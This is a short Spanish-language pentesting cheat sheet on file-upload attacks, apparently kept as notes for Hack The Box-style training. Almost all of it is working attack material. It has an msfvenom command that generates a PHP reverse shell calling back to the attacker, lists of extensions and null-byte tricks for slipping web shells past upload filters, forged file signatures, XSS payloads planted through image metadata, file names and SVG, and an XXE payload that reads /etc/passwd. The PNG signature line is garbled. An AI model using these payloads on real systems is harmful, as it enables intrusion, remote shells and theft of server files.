# WebShell
[phpbash](https://github.com/Arrexel/phpbash)
```
/usr/share/wordlists/seclists/Web-Shells/
```

# Revsell
[revshell](https://www.revshells.com/)
```
msfvenom -p php/reverse_php LHOST=OUR_IP LPORT=OUR_PORT -f raw > reverse.php
```

# Bypass
1. FrontEnd bypass: Cambiar el tipo de archivo cuando se intercepta
2. Cambiar la extension 
```
.jpeg.php
.jpg.php
.png.php
.php
.php3
.php4
.php5
.php7
.php8
.pht
.phar
.phpt
.pgif
.phtml
.phtm
.php%00.gif
.php\x00.gif
.php%00.png
.php\x00.png
.php%00.jpg
.php\x00.jpg
.inc
```
3. Usar el encabexzado Content-Type: image/png (/usr/share/wordlists/seclists/Discovery/Web-Content/web-all-content-types.txt)
4. Cambiar las firmas de los archivos
- PNG: \x89PNG\r\n\x1a\n\0\0\0\rIHDR\0\0\x03H\0\xs0\x03[
- JPG: \xff\xd8\xff
- GIF: GIF87a OR GIF8;
5. Doble extension (Recuerda que en algunas aplicaciones borra la ultima extension)
```
shell.jpg.php
shell.php.jpg
```
6. Usar estos cracteres para romper la doble extension eliminado la ultima (/usr/share/wordlists/seclists/Discovery/Web-Content/web-extensions.txt)
```
%20
%0a
%00
%0d0a
/
.\
.
…
\x00
:
%0d%0a
```
7. Otras
```
# XSS
## HTML (text/html)
exiftool -Comment=' "><img src=1 onerror=alert(window.origin)>' HTB.jpg
cp HBT.jpg > ' "><img src=1 onerror=alert(window.origin)>'.jpg

## SVG

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
<svg xmlns="http://www.w3.org/2000/svg" version="1.1" width="1" height="1">
    <rect x="1" y="1" width="1" height="1" fill="green" stroke="black" />
    <script type="text/javascript">alert(window.origin);</script>
</svg>

# XEE
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<svg>&xxe;</svg>
```
